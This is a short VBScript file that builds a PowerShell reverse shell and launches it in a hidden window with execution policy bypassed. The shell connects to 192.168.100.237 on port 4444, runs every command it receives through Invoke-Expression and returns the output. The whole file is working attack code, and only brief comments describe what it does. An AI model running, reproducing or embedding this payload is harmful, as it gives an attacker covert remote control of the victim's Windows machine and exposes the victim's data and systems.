Set objShell = CreateObject("WScript.Shell")

' PowerShell reverse shell command embedded in VBScript
powershellCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " & _
    """$client = New-Object System.Net.Sockets.TCPClient('192.168.100.237', 4444); " & _
    "$stream = $client.GetStream(); " & _
    "[byte[]]$bytes = 0..65535|%{0}; " & _
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; " & _
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); " & _
    "$sendback = (iex $data 2>&1 | Out-String ); " & _
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; " & _
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); " & _
    "$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; " & _
    "$client.Close()"""

' Run PowerShell command hidden (0 means hidden, 1 is visible)
objShell.Run powershellCommand, 0, False
